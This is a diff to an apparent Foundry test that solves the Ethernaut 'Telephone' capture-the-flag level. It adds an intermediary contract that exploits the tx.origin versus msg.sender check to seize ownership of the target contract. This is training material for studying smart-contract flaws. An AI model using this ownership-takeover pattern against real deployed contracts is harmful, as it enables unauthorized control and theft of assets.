@@ -29,11 +29,38 @@ contract TelephoneTest is Test {
         // LEVEL ATTACK //
         //////////////////
 
+        // To change the owner in the Telephone contract
+        // tx.origin != msg.sender. Hence, an OEA cannot directly call the changeOwner function
+        // An intermediary contract is needed: TelephoneCaller
+        TelephoneCaller telephoneCaller = new TelephoneCaller(address(ethernautTelephone), attacker);
+        telephoneCaller.callTelephone();
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+    }
+}
+
+contract TelephoneCaller {
+    Telephone telephone;
+    address attacker;
+
+    constructor(address _telephone, address _attacker) {
+        require(_telephone.code.length > 0, "Not a contract");
+        require(_attacker != address(0), "attacker not set");
+        telephone = Telephone(_telephone);
+        attacker = _attacker;
+    }
+
+    modifier onlyAttacker() {
+        require(msg.sender == attacker);
+        _;
+    }
+
+    function callTelephone() external onlyAttacker {
+        telephone.changeOwner(attacker);
     }
 }
